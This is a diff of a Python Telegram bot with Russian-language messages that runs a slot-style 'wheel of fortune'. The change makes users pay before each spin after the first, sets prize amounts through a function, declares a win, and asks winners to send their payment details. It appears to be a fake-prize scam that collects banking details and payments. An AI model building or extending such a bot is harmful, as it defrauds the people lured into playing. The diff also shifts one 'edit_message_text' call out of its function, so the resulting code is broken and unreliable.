@@ -107,21 +107,29 @@ def command_admin(message):
 @bot.callback_query_handler(func=lambda call: call.data == "free_spin")
 def handle_free_spin(call):
     uid = call.from_user.id
-    if first_spin_done.get(uid):
-        bot.answer_callback_query(call.id, "❌ Бесплатная попытка уже использована.")
+    spin_count = get_spin_count(uid)
+
+    if spin_count == 0:
+        # первая прокрутка
+        pass
+    elif uid not in payment_pending:
+        bot.answer_callback_query(call.id, "❌ Сначала оплати, чтобы снова крутить.")
         return
-    first_spin_done[uid] = True
+
+    increment_spin_count(uid)
     msg = bot.send_message(uid, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
     time.sleep(1)
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍒 💣 🍋 ]")
     time.sleep(1)
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍉 ]")
     time.sleep(1)
-    amount = 50  # фиксированная сумма для первой попытки
+    
+    amount = determine_amount(uid)
     code = generate_code(amount, uid)
     user_states[uid] = {"amount": amount, "code": code}
     bot.send_message(uid, f"🎉 ПОБЕДА {amount}₽!\nКод: `{code}`\nОтправь свои реквизиты:", parse_mode="Markdown")
 
+    
 @bot.callback_query_handler(func=lambda call: call.data == "pay")
 def handle_pay(call):
     uid = call.from_user.id
@@ -177,10 +185,10 @@ def confirm_payment(call):
                 break
         with open(CODES_FILE, "w") as f:
             json.dump(codes, f, indent=4)
-        first_spin_done[uid] = False
         markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🎯 Крутить", callback_data="free_spin"))
         bot.send_message(uid, "✅ Оплата подтверждена! Можешь снова крутить колесо:", reply_markup=markup)
-        bot.edit_message_text("✅ Подтверждено.", chat_id=call.message.chat.id, message_id=call.message.message_id)
+       
+bot.edit_message_text("✅ Подтверждено.", chat_id=call.message.chat.id, message_id=call.message.message_id)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("reject_"))
 def reject_payment(call):
